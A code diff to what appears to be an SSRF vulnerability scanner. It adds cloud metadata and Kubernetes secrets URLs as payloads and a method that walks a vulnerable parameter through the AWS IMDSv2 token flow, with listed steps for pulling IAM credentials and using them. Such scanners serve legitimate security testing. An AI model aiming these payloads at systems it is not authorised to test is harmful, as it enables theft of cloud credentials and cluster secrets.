@@ -39,14 +39,30 @@ _CLOUD_METADATA_TARGETS = {
         "http://169.254.169.254/latest/user-data/",
         "http://instance-data/latest/meta-data/",
     ],
+    # Phase 2: AWS IMDSv2 (requires PUT token first — tested via test_imdsv2())
+    "aws_imdsv2": [
+        "http://169.254.169.254/latest/meta-data/",
+        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+    ],
+    # Phase 2: AWS ECS task metadata
+    "aws_ecs": [
+        "http://169.254.170.2/v2/metadata",
+        "http://169.254.170.2/v2/stats",
+        "http://169.254.170.2/v3/",
+    ],
     "gcp": [
         "http://metadata.google.internal/computeMetadata/v1/",
         "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+        "http://metadata.google.internal/computeMetadata/v1/project/project-id",
+        "http://metadata.google.internal/computeMetadata/v1/instance/hostname",
         "http://metadata/computeMetadata/v1/",
+        # GCP also responds at 169.254.169.254 with Metadata-Flavor header
+        "http://169.254.169.254/computeMetadata/v1/",
     ],
     "azure": [
         "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
         "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
+        "http://169.254.169.254/metadata/instance/compute/resourceGroupName?api-version=2021-02-01&format=text",
     ],
     "digitalocean": [
         "http://169.254.169.254/metadata/v1/",
@@ -81,6 +97,23 @@ _INTERNAL_SERVICE_TARGETS = {
     "mysql": [
         ("http://localhost:3306/", "mysql_native_password"),
         ("http://127.0.0.1:3306/", "Host"),
+    ],
+    # Phase 2: Kubernetes API server (internal cluster)
+    "kubernetes_api": [
+        ("http://kubernetes.default.svc/api/v1/", "apiVersion"),
+        ("http://kubernetes.default.svc.cluster.local/api/v1/", "apiVersion"),
+        ("http://10.0.0.1/api/v1/", "apiVersion"),       # common cluster IP
+        ("https://kubernetes.default.svc/api/v1/", "apiVersion"),
+    ],
+    # Phase 2: Kubernetes service account token via SSRF
+    "kubernetes_sa_token": [
+        ("http://kubernetes.default.svc/api/v1/secrets", "\"kind\""),
+        ("http://kubernetes.default.svc/api/v1/namespaces/default/secrets", "\"items\""),
+    ],
+    # Phase 2: ECS task metadata endpoint
+    "ecs_task_metadata": [
+        ("http://169.254.170.2/v2/metadata", "TaskARN"),
+        ("http://169.254.170.2/v2/stats",    "cpu_stats"),
     ],
 }
 
@@ -329,6 +362,96 @@ class SSRFScanner:
 
     # ── Testing Methods ───────────────────────────────────────────────────────
 
+    # Phase 2: IMDSv2 / Kubernetes / ECS SSRF (Pillar 4.3)
+
+    async def test_imdsv2(
+        self,
+        url: str,
+        method: str,
+        param_name: str,
+    ) -> Optional[SSRFfinding]:
+        """
+        Test AWS IMDSv2 SSRF — the PUT → GET token dance.
+
+        IMDSv2 requires a session token obtained via PUT to the metadata endpoint
+        with TTL header. If the target application can be made to:
+          1. PUT http://169.254.169.254/latest/api/token (obtain token)
+          2. GET http://169.254.169.254/latest/meta-data/ with X-aws-ec2-metadata-token
+        then IMDSv2 is bypassed.
+
+        Most scanners only test IMDSv1 GET. This tests the full IMDSv2 flow.
+        """
+        _imdsv2_token_url  = "http://169.254.169.254/latest/api/token"
+        _imdsv2_meta_url   = "http://169.254.169.254/latest/meta-data/"
+        _imdsv2_ttl_header = {"X-aws-ec2-metadata-token-ttl-seconds": "21600"}
+
+        try:
+            # Step 1: Try to obtain IMDSv2 token via the target's PUT capability
+            if method in ("POST", "PUT"):
+                token_resp = await self.http_client.request(
+                    "PUT",
+                    f"{url}?{param_name}={quote(_imdsv2_token_url)}",
+                    headers=_imdsv2_ttl_header,
+                )
+            else:
+                token_resp = await self.http_client.get(
+                    f"{url}?{param_name}={quote(_imdsv2_token_url)}",
+                    headers=_imdsv2_ttl_header,
+                )
+
+            token_value = (token_resp.text or "").strip()
+            if not token_value or len(token_value) > 256:
+                token_value = ""
+
+            # Step 2: Use token (or empty) to fetch metadata
+            meta_headers = {}
+            if token_value:
+                meta_headers["X-aws-ec2-metadata-token"] = token_value
+
+            if method == "GET":
+                meta_resp = await self.http_client.get(
+                    f"{url}?{param_name}={quote(_imdsv2_meta_url)}",
+                    headers=meta_headers,
+                )
+            else:
+                meta_resp = await self.http_client.post(
+                    url,
+                    data={param_name: _imdsv2_meta_url},
+                    headers=meta_headers,
+                )
+
+            indicators = ["ami-id", "instance-id", "iam", "security-credentials",
+                          "local-hostname", "local-ipv4", "public-ipv4"]
+            if any(ind in meta_resp.text for ind in indicators):
+                tier = "IMDSv2" if token_value else "IMDSv1-fallback"
+                return SSRFfinding(
+                    finding_id=hashlib.md5(
+                        f"ssrf_imdsv2_{url}_{param_name}".encode()
+                    ).hexdigest()[:16],
+                    title=f"SSRF to AWS {tier} Metadata Endpoint",
+                    severity="critical",
+                    url=url,
+                    parameter=param_name,
+                    ssrf_type="cloud_metadata",
+                    target=_imdsv2_meta_url,
+                    payload=_imdsv2_token_url,
+                    evidence=(
+                        f"AWS {tier} metadata accessed via SSRF. "
+                        f"Token obtained: {bool(token_value)}. "
+                        f"Response: {meta_resp.text[:200]}"
+                    ),
+                    confidence=0.95,
+                    exploitation_steps=[
+                        f"1. PUT {_imdsv2_token_url} with X-aws-ec2-metadata-token-ttl-seconds to get token",
+                        f"2. GET {_imdsv2_meta_url} with X-aws-ec2-metadata-token: <token>",
+                        "3. Enumerate IAM roles: /latest/meta-data/iam/security-credentials/",
+                        "4. Fetch credentials: /latest/meta-data/iam/security-credentials/<role>",
+                        "5. Use credentials to access AWS APIs",
+                    ],
+                )
+        except Exception as exc:
+            log.debug("test_imdsv2 failed on %s: %s", url, exc)
+        return None
     async def test_cloud_metadata(
         self,
         url: str,
@@ -902,6 +1025,7 @@ class SSRFScanner:
         # Run all primary SSRF tests
         tests = [
             self.test_cloud_metadata(url, method, param_name),
+            self.test_imdsv2(url, method, param_name),       # Phase 2: IMDSv2 PUT→GET flow
             self.test_internal_services(url, method, param_name),
             self.test_protocol_smuggling(url, method, param_name),
             self.test_localhost_bypass(url, method, param_name),
